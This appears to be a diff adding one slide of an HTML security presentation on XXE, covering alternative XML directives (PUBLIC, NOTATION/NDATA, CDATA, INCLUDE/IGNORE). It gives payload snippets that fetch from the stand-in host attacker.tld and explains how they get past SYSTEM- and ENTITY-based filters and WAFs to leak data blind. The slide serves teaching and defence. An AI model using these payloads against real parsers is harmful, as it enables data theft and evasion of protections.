@@ -1,0 +1,35 @@
+<section>
+  <h2 class="section-title">Beyond <code>SYSTEM</code> &mdash; XML's other directives</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header"><code>PUBLIC</code> &mdash; same fetch, alt syntax</div>
+        <pre><code class="language-xml">&lt;!ENTITY xxe PUBLIC
+  "fake-public-id"
+  "http://attacker.tld/leak"&gt;</code></pre>
+      </div>
+      <div class="card card-red" style="margin-top: 12px;">
+        <div class="card-header"><code>&lt;!NOTATION&gt;</code> + <code>NDATA</code> &mdash; legacy fetch path</div>
+        <pre><code class="language-xml">&lt;!NOTATION n SYSTEM
+  "http://attacker.tld/n"&gt;
+&lt;!ENTITY  e SYSTEM "x" NDATA n&gt;</code></pre>
+      </div>
+    </div>
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header"><code>&lt;![CDATA[...]]&gt;</code> &mdash; payload smuggling</div>
+        <pre><code class="language-xml">&lt;name&gt;&lt;![CDATA[
+  &amp;xxe; &lt;script&gt;...&lt;/script&gt;
+]]&gt;&lt;/name&gt;</code></pre>
+      </div>
+      <div class="card card-red" style="margin-top: 12px;">
+        <div class="card-header">conditional sections &mdash; bisection blind</div>
+        <pre><code class="language-xml">&lt;![INCLUDE[ &lt;!ENTITY % go SYSTEM "..."&gt; ]]&gt;
+&lt;![IGNORE[  ...skipped block...        ]]&gt;</code></pre>
+      </div>
+    </div>
+  </div>
+  <div class="textbox" style="margin-top: 14px;">
+    <p><span class="inline-tag tag-purple">Why this matters</span> Filters grepping <code>SYSTEM</code> miss <code>PUBLIC</code>. Filters blocking <code>&lt;!ENTITY</code> miss <code>&lt;!NOTATION</code>. <code>CDATA</code> wraps payloads past XML-aware WAFs. Replace the <code>INCLUDE</code>/<code>IGNORE</code> keyword with a parameter entity reference and you toggle DTD blocks based on leaked data &mdash; one bit per request, <em>no DNS or HTTP egress required</em>.</p>
+  </div>
+</section>
